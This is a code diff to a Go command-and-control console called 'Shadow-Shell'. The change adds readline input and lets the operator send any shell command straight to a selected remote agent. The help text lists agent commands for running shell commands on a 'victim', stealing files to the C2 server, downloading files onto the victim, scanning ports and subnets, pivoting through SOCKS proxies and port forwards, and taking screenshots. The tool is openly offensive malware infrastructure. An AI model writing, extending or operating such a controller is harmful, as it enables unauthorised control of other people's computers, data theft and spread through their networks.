@@ -1,7 +1,6 @@
 package main
 
 import (
-	"bufio"
 	"bytes"
 	"encoding/json"
 	"fmt"
@@ -12,6 +11,8 @@ import (
 	"path/filepath"
 	"strings"
 	"time"
+
+	"github.com/chzyer/readline"
 )
 
 // --- CONFIG STRUCTURE ---
@@ -154,20 +155,39 @@ func updateGist(newContent string) bool {
 // --- UI FUNCTIONS ---
 
 func handleShell() {
-	scanner := bufio.NewScanner(os.Stdin)
+	rl, err := readline.NewEx(&readline.Config{
+		Prompt:          ColorCyan + "Shadow-Shell > " + ColorReset,
+		HistoryFile:     "shadow_history.tmp",
+		InterruptPrompt: "^C",
+		EOFPrompt:       "exit",
+	})
+	if err != nil {
+		fmt.Println("Error initializing readline:", err)
+		return
+	}
+	defer rl.Close()
+
 	var activeAgentID string
 
 	for {
 		if activeAgentID == "" {
-			fmt.Print(ColorCyan + "Shadow-Shell > " + ColorReset)
+			rl.SetPrompt(ColorCyan + "Shadow-Shell > " + ColorReset)
 		} else {
-			fmt.Printf(ColorRed+"Shadow-Shell [%s] > "+ColorReset, activeAgentID)
+			rl.SetPrompt(ColorRed + "Shadow-Shell [" + activeAgentID + "] > " + ColorReset)
 		}
 
-		if !scanner.Scan() {
+		line, err := rl.Readline()
+		if err == readline.ErrInterrupt {
+			if len(line) == 0 {
+				continue // Don't exit on Ctrl+C, just reset prompt
+			} else {
+				continue
+			}
+		} else if err == io.EOF {
 			break
 		}
-		line := scanner.Text()
+
+		line = strings.TrimSpace(line)
 		parts := strings.Fields(line)
 
 		if len(parts) == 0 {
@@ -177,11 +197,14 @@ func handleShell() {
 		command := parts[0]
 		args := parts[1:]
 
+		// Handle built-in C2 commands
 		switch command {
 		case "help":
 			printHelp()
+			continue
 		case "agents", "list":
 			listAgents()
+			continue
 		case "use":
 			if len(args) < 1 {
 				fmt.Println("Usage: use <ID>")
@@ -196,17 +219,27 @@ func handleShell() {
 					fmt.Println("Agent not found.")
 				}
 			}
+			continue
 		case "back":
 			activeAgentID = ""
-		case "exec":
-			if activeAgentID == "" {
-				fmt.Println("Select agent first.")
-			} else {
-				queueCommand(activeAgentID, strings.Join(args, " "))
-			}
+			continue
 		case "exit":
 			exec.Command("taskkill", "/F", "/IM", "ngrok.exe").Run()
 			os.Exit(0)
+		}
+
+		// If we reach here, it's not a built-in C2 command.
+		if activeAgentID == "" {
+			fmt.Println("[-] Unknown command or no agent selected. Type 'help' or 'use <ID>'.")
+		} else {
+			// If it starts with "exec ", remove it for backwards compatibility, otherwise just send the line
+			cmdString := line
+			if command == "exec" {
+				cmdString = strings.Join(args, " ")
+			}
+			if cmdString != "" {
+				queueCommand(activeAgentID, cmdString)
+			}
 		}
 	}
 }
@@ -244,15 +277,15 @@ func printHelp() {
 	fmt.Println("exit             : Exit C2")
 
 	fmt.Println("\n--- AGENT COMMANDS ---")
-	fmt.Println("exec <cmd>       : Run shell command")
-	fmt.Println("exec sysinfo          : Get system details")
-	fmt.Println("exec download <url> <path> : Download file FROM internet TO victim")
-	fmt.Println("exec upload <path>    : Steal file FROM victim TO C2 server")
-	fmt.Println("exec cd <path>        : Change directory")
-	fmt.Println("exec scan <ip>        : Scan a single IP for open ports")
-	fmt.Println("exec scan sweep <sub> : Ping sweep a subnet (e.g. 192.168.1)")
-	fmt.Println("exec pivot socks <p>  : Start a pure-Go SOCKS5 proxy on agent's port <p>")
-	fmt.Println("exec pivot fwd <p> <t>: Forward agent port <p> to target <t> (e.g. 10.0.0.5:80)")
+	fmt.Println("<cmd>            : Run any shell command directly (e.g. whoami, dir)")
+	fmt.Println("sysinfo          : Get system details")
+	fmt.Println("download <url> <path> : Download file FROM internet TO victim")
+	fmt.Println("upload <path>    : Steal file FROM victim TO C2 server")
+	fmt.Println("cd <path>        : Change directory")
+	fmt.Println("scan <ip>        : Scan a single IP for open ports")
+	fmt.Println("scan sweep <sub> : Ping sweep a subnet (e.g. 192.168.1)")
+	fmt.Println("pivot socks <p>  : Start a pure-Go SOCKS5 proxy on agent's port <p>")
+	fmt.Println("pivot fwd <p> <t>: Forward agent port <p> to target <t> (e.g. 10.0.0.5:80)")
 	fmt.Println("screenshot       : Take a screenshot and upload to C2")
 	fmt.Println("kill             : Kill the agent")
 	fmt.Println("")
